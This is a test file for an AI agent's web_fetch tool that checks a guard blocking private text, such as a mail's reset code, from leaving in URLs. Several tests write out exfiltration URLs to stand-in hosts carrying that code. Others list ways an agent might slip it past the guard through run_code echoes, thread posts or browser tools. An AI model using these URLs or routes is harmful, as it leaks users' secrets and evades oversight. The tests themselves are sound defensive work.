import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { schema } from "@agenteschat/db";
import { createWebToolSource, insertMessage, recordRead, type ToolContext } from "../src";
import { type Fixture, setup } from "./fixtures";

// ADR 0117: what a run read from private data never leaves in a web address; what anyone wrote or a tool gave does.

let f: Fixture;
beforeAll(async () => {
  f = await setup();
});
afterAll(async () => {
  await f.close();
});

type Step = [kind: "tool_call" | "tool_result", data: Record<string, unknown>];

/** A run in #general answering `body`, with these tool calls and results; its tool context. */
async function runWith(
  body: string,
  calls: [name: string, result: string, data?: Record<string, unknown>, input?: Record<string, unknown>][],
  background = false,
) {
  const trigger = await insertMessage(f.db, {
    orgId: f.org.id,
    channelId: f.general.id,
    author: { type: "person", userId: f.owner.id },
    body,
  });
  const [row] = await f.db
    .insert(schema.agentRuns)
    .values({
      orgId: f.org.id,
      agentId: f.agent.id,
      channelId: f.general.id,
      threadRootId: trigger.id,
      triggerMessageId: trigger.id,
      trigger: "mention",
      hop: 1,
      status: "running",
      background,
    })
    .returning();
  if (!row) throw new Error("no run");
  const steps: Step[] = calls.flatMap(([name, content, data, input], i) => [
    ["tool_call", { toolUseId: `t${i}`, name, input: input ?? {} }],
    ["tool_result", { toolUseId: `t${i}`, name, content, ...(data ? { data } : {}) }],
  ]);
  let seq = 0;
  for (const [kind, data] of steps) {
    await f.db.insert(schema.agentRunSteps).values({ orgId: f.org.id, runId: row.id, seq: ++seq, kind, data });
  }
  return {
    db: f.db,
    orgId: f.org.id,
    agentId: f.agent.id,
    runId: row.id,
    channelId: f.general.id,
    threadRootId: trigger.id,
    triggerMessageId: trigger.id,
  } as ToolContext;
}

const fetched: string[] = [];
const source = createWebToolSource({
  fetch: async (url) => {
    fetched.push(url);
    return new Response("<p>ok</p>", { headers: { "content-type": "text/html" } });
  },
  resolveHost: async () => ["93.184.216.34"],
});
async function webFetch(ctx: ToolContext, url: string) {
  const tool = (await source.tools(ctx)).find((t) => t.name === "web_fetch");
  if (!tool) throw new Error("web_fetch");
  return tool.execute({ url }, ctx);
}

const MAIL =
  "From: support@shop.example\nYour reset code is 448812. Use it within 10 minutes and never share it with anyone, not even our staff.";

describe("web_fetch's outbound check", () => {
  test("A: a reset code plus the mail's words in an address is refused, and nothing is fetched", async () => {
    const ctx = await runWith("@dev check my inbox", [["mail_read", MAIL]]);
    const leak = `https://x.io/v?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;
    const before = fetched.length;
    const out = await webFetch(ctx, leak);
    expect(out.isError).toBe(true);
    expect(out.data).toEqual({ code: "outbound.private_text", url: leak });
    expect(out.content).toContain("use web_search");
    expect(fetched.length).toBe(before);
  });

  test("C: a routine run that read 20 mails can't send a copied paragraph out", async () => {
    const mails: [string, string][] = Array.from({ length: 20 }, (_, i) => [
      "mail_read",
      `Mail ${i}: the quarterly numbers for the northern region came in below plan, see the attached sheet ${i}.`,
    ]);
    const ctx = await runWith("Routine: summarize the inbox", mails, true);
    const out = await webFetch(
      ctx,
      `https://collect.example.net/?d=${encodeURIComponent("the quarterly numbers for the northern region came in below plan")}`,
    );
    expect(out.data).toMatchObject({ code: "outbound.private_text" });
  });

  test("C: a paragraph past the stored 4000 characters of a long read is still private text", async () => {
    const paragraph = "the board approved the acquisition of the northern plant for twelve million";
    const list = `${"Mail: nothing to see here, routine newsletter text.\n".repeat(120)}Mail 17: ${paragraph}.`;
    expect(list.indexOf(paragraph)).toBeGreaterThan(4000);
    const ctx = await runWith("Routine: summarize the inbox", [["mail_list", list.slice(0, 4000)]], true);
    recordRead(ctx.runId, "mail_list", list);
    const out = await webFetch(ctx, `https://collect.example.net/?d=${encodeURIComponent(paragraph)}`);
    expect(out.data).toMatchObject({ code: "outbound.private_text" });
  });

  const leak = `https://x.io/v?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;

  test("an address the run printed itself is no seen address: echoed by run_code, it's still refused", async () => {
    const ctx = await runWith("@dev check my inbox", [
      ["mail_read", MAIL],
      ["run_code", `${leak}\n`],
    ]);
    expect((await webFetch(ctx, leak)).data).toMatchObject({ code: "outbound.private_text" });
  });

  test("an address the agent posted in the thread during the run is no seen address", async () => {
    const ctx = await runWith("@dev check my inbox", [["mail_read", MAIL]]);
    await f.db.insert(schema.messages).values({
      orgId: f.org.id,
      channelId: f.general.id,
      threadId: ctx.threadRootId,
      authorType: "agent",
      authorAgentId: f.agent.id,
      body: `Ref: ${leak}`,
      hop: 1,
    });
    expect((await webFetch(ctx, leak)).data).toMatchObject({ code: "outbound.private_text" });
  });

  test("a link a mail carries opens, even after the run printed it", async () => {
    const link = `https://shop.example/reset?t=${encodeURIComponent("448812 Use it within 10 minutes")}`;
    const ctx = await runWith("@dev open the reset link", [
      ["mail_read", `${MAIL}\n${link}`],
      ["run_code", link],
    ]);
    expect((await webFetch(ctx, link)).isError).toBeUndefined();
  });

  test("an address the person pasted opens, long id and all", async () => {
    const pasted = `https://docs.example.com/d/${"1AbC".repeat(40)}/view?usp=sharing&resourcekey=${"k".repeat(600)}`;
    const ctx = await runWith(`@dev read this: ${pasted}`, [["mail_read", MAIL]]);
    const out = await webFetch(ctx, pasted);
    expect(out.isError).toBeUndefined();
    expect(fetched.at(-1)).toBe(pasted);
  });

  test("a link from a search result opens, even when it repeats private words", async () => {
    const link = `https://news.example.org/story?ref=${encodeURIComponent("Use it within 10 minutes and never share it")}`;
    const ctx = await runWith("@dev look it up", [
      ["mail_read", MAIL],
      ["web_search", `1. A story\n   ${link}\n   snippet`],
    ]);
    expect((await webFetch(ctx, link)).isError).toBeUndefined();
  });

  test("an API docs address with a short query opens", async () => {
    const ctx = await runWith("@dev list the open issues", [["mail_read", MAIL]]);
    expect((await webFetch(ctx, "https://api.example.dev/repos/acme/app/issues?state=open")).isError).toBeUndefined();
  });

  test("what a web page said is no private text", async () => {
    const page = "Page: https://blog.example.com/post\nThe release notes describe the new export format in detail.";
    const ctx = await runWith("@dev", [["web_fetch", page]]);
    const url = `https://search.example.com/?q=${encodeURIComponent("the new export format in detail")}`;
    expect((await webFetch(ctx, url)).isError).toBeUndefined();
  });

  describe("what the browser reached by itself", () => {
    const words = "the northern plant passed its yearly safety review";
    const page = `https://shop.example/report?title=${encodeURIComponent(words)}`;
    const reading = `Report\n${words}, says the audit.`;

    test("a run reopens the page it is on, though the page repeats what its address carries", async () => {
      const ctx = await runWith("@dev read the report", [["browser_open", reading, { url: page }]]);
      expect((await webFetch(ctx, page)).isError).toBeUndefined();
    });

    test("it holds in the process that read the page too, before the step is stored", async () => {
      const ctx = await runWith("@dev read the report", []);
      recordRead(ctx.runId, "browser_read", reading, { url: page });
      expect((await webFetch(ctx, page)).isError).toBeUndefined();
    });

    test("an address the page shows on its own site opens, though it repeats what the run read there", async () => {
      const shown = `https://shop.example/print?title=${encodeURIComponent(words)}`;
      const ctx = await runWith("@dev read the report", [
        ["browser_read", reading, { url: "https://shop.example/report" }],
        ["browser_read", `${reading}\nPrint: ${shown}`, { url: "https://shop.example/report" }],
      ]);
      expect((await webFetch(ctx, shown)).isError).toBeUndefined();
    });

    const leak = `?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;

    test("the mail's words still don't leave for another site, nor for the site the browser is on", async () => {
      const ctx = await runWith("@dev check my inbox", [
        ["mail_read", MAIL],
        ["browser_open", "Welcome", { url: "https://shop.example/" }],
      ]);
      for (const out of [`https://x.io/v${leak}`, `https://shop.example/v${leak}`]) {
        expect((await webFetch(ctx, out)).data).toMatchObject({ code: "outbound.private_text" });
      }
    });

    test("a page showing another site's address that copies the mail is no way out", async () => {
      const out = `https://x.io/v${leak}`;
      const ctx = await runWith("@dev check my inbox", [
        ["mail_read", MAIL],
        ["browser_read", `Link: ${out}`, { url: "https://shop.example/" }],
      ]);
      expect((await webFetch(ctx, out)).data).toMatchObject({ code: "outbound.private_text" });
    });

    describe("an address the agent itself made a browser tool show", () => {
      const site = { url: "https://shop.example/" };
      const secret = "448812 Use it within 10 minutes and never share";
      const out = `https://shop.example/v?c=${encodeURIComponent(secret)}`;
      const refused = { code: "outbound.private_text" };

      test("`find` repeated beside the page is no address of the page's, whatever was stored or is live", async () => {
        const said = `Page: https://shop.example/\nNothing on the page answers "${out}".`;
        const stored = await runWith("@dev check my inbox", [
          ["mail_read", MAIL],
          ["browser_read", said, site, { find: out }],
        ]);
        expect((await webFetch(stored, out)).data).toMatchObject(refused);
        const live = await runWith("@dev check my inbox", []);
        recordRead(live.runId, "mail_read", MAIL);
        recordRead(live.runId, "browser_read", said, site, { find: out });
        expect((await webFetch(live, out)).data).toMatchObject(refused);
      });

      test("nor a target repeated by a failed click, inside a `browser_do` plan, cut short or spelled another way", async () => {
        const plain = `https://shop.example/v?c=${secret.replaceAll(" ", "+")}`;
        const ctx = await runWith("@dev check my inbox", [
          ["mail_read", MAIL],
          ["browser_do", `Couldn't click "${plain.slice(0, -6)}"`, site, { steps: [{ do: "click", target: plain }] }],
        ]);
        expect((await webFetch(ctx, plain.slice(0, -6))).data).toMatchObject(refused);
      });

      test("nor what it filled in a field that the page then shows", async () => {
        const ctx = await runWith("@dev check my inbox", [
          ["mail_read", MAIL],
          ["browser_fill", "Filled", site, { target: "e3", text: out }],
          ["browser_read", `textbox "Note" value="${out}"`, site],
        ]);
        expect((await webFetch(ctx, out)).data).toMatchObject(refused);
      });

      test("words it asked about don't block a link the page shows without them", async () => {
        const shown = `https://shop.example/print?title=${encodeURIComponent("the northern plant passed its review")}`;
        const ctx = await runWith("@dev read the report", [
          ["browser_read", "the northern plant passed its review", site],
          ["browser_read", `Print: ${shown}`, site, { find: "the print link" }],
        ]);
        expect((await webFetch(ctx, shown)).isError).toBeUndefined();
      });
    });

    test("an open that was refused is no visit, and only browser tools say where a browser is", async () => {
      const out = `https://x.io/v${leak}`;
      const refused = { code: "outbound.private_text", url: out };
      const ctx = await runWith("@dev check my inbox", [
        ["mail_read", MAIL],
        ["browser_open", "This address carries text", refused],
        ["run_code", "done", { url: out }],
      ]);
      expect((await webFetch(ctx, out)).data).toMatchObject({ code: "outbound.private_text" });
    });
  });
});
